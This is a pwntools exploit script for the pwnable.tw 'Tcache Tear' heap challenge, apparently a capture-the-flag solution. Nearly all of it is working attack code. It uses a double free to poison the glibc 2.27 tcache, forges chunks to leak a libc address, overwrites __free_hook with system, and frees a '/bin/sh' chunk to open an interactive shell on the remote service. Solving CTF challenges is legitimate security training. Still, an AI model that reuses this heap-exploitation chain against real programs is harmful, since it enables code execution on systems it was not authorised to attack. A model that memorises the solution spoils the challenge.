#!/usr/bin/env python3
import pwn

exe = pwn.ELF("./tcache_teare")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-2.27.so")
# pwn.context.log_level='debug'
pwn.context.terminal = ["foot"]
if pwn.args.REMOTE:
    p = pwn.remote("chall.pwnable.tw", 10207)
else:
    p = pwn.process([exe.path])
    def gdbs():
        pwn.gdb.attach(p, gdbscript='''

         #malloc
        b*0x0000000000400b54
        #free
        b*0x0000000000400c54

                       ''')
        # p = pwn.gdb.debug([exe.path],"""
        # #malloc
        # b*0x0000000000400b54
        # #free
        # b*0x0000000000400c54
        #
        #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
def add(size,data):
    sa(b"choice :",b"1")
    sa(b"Size:",str(size).encode())
    sa(b"Data:",data)
def delete():
    sa(b"choice :",b"2")
def info():
    sa(b"choice :",b"3")
def writeto(addr,data,size):
    add(size,b"aa")
    delete()
    delete()
    add(size,pwn.p64(addr))
    add(size,pwn.p64(addr))
    add(size,data)


if __name__ == "__main__":
    # p = conn()
    sa(b"Name:",b"lmao")
    # delete()
    # add(0x50,b"bbbb")
    # delete()
    writeto(0x6024a0, pwn.p64(0) +pwn.p64(0x21) +pwn.p64(0) +pwn.p64(0) +pwn.p64(0) +pwn.p64(0x21),0x70)
    writeto(0x602050, pwn.p64(0) +pwn.p64(0x451) + pwn.p64(0) +pwn.p64(0) +pwn.p64(0)*3+pwn.p64(0x602060),0x60)
    gdbs()
    delete()
    sa(b"choice :",b"3")
    p.recvuntil(b"Name :")
    libc.address = pwn.u64(p.recv(6).ljust(8,b"\x00"))-19616-4091904
    pwn.log.info(f"leak libc: {hex(libc.address)}")
    pwn.log.info(f"malloc hook: {hex(libc.sym["__malloc_hook"])}")
    for i in range(10):
        add(100,b"/bin/sh\0")
    add(88,b"a")
    writeto(libc.sym["__free_hook"],pwn.p64(libc.sym["system"]),0x30)
    add(0x20,b"/bin/sh\0")
    delete()

    # writeto(libc.sym["__malloc_hook"],pwn.p64(libc.sym["system"]),100)
    # writeto(0x602060,pwn.p64(0)*6,0x90)

    # delete()







    # good luck pwning :)
    p.interactive()
